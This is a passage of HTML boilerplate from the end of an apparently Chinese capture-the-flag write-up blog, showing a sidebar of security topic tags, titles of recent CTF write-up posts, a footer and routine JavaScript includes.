			<li><a href="/tags/fuzz/">fuzz<span>6</span></a></li>
		
			<li><a href="/tags/js/">js<span>1</span></a></li>
		
			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
		
			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
		
			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
		
			<li><a href="/tags/无回显rce/">无回显rce<span>1</span></a></li>
		
			<li><a href="/tags/NISACTF2022/">NISACTF2022<span>8</span></a></li>
		
			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
		
			<li><a href="/tags/libc/">libc<span>1</span></a></li>
		
			<li><a href="/tags/sql/">sql<span>8</span></a></li>
		
			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
		
			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
		
		
		   <li><a href="/tags">...<span>111</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2023/11/10/swampctf2019-syscaller-wp/" ><i class="fa fa-file-o"></i>swampctf2019-syscaller-wp</a>
      </li>
    
      <li>
        <a href="/2023/11/07/Backdoorctf-funsignals-wp/" ><i class="fa fa-file-o"></i>Backdoorctf-funsignals-wp</a>
      </li>
    
      <li>
        <a href="/2023/10/25/HDCTF2023-YamiYami-wp/" ><i class="fa fa-file-o"></i>HDCTF2023-YamiYami-wp</a>
      </li>
    
      <li>
        <a href="/2023/10/23/GDOUCTF2023-reverseClock-wp/" ><i class="fa fa-file-o"></i>GDOUCTF2023-反方向的钟-wp</a>
      </li>
    
      <li>
        <a href="/2023/10/20/ssti/" ><i class="fa fa-file-o"></i>SSTI模板注入</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer>  </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
